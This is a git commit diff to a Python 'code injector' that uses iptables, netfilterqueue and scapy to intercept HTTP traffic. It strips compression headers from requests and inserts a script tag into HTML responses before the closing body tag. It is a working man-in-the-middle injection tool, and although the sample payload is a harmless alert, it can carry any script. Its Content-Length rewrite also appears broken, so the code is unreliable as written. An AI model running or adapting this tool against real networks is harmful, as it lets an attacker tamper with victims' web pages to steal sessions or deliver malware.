9013f40a8e8ed276cd3bf92ae6222d92eb1a2ff7
Pawan <goodoldie1996@gmail.com>
2021-05-14 09:33:14 -0400

    Updated code injector

--- code_injector.py
+++ code_injector.py
@@ -1,6 +1,7 @@
 import netfilterqueue
 import scapy.all as scapy
 import re
+
 '''
 iptables -I INPUT -j NFQUEUE --queue-num 0
 iptables -I OUTPUT -j NFQUEUE --queue-num 0
@@ -21,15 +22,25 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            print(scapy_packet.show())
+            # print(scapy_packet.show())
+            injection_code = "<script>alert('Who dis?');</script>"
+            load = scapy_packet[scapy.Raw].load.replace("</body>", injection_code + "</body>")
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search:
+                content_length = content_length_search.group(0)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
 
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(str(new_packet))
 
     packet.accept()
 
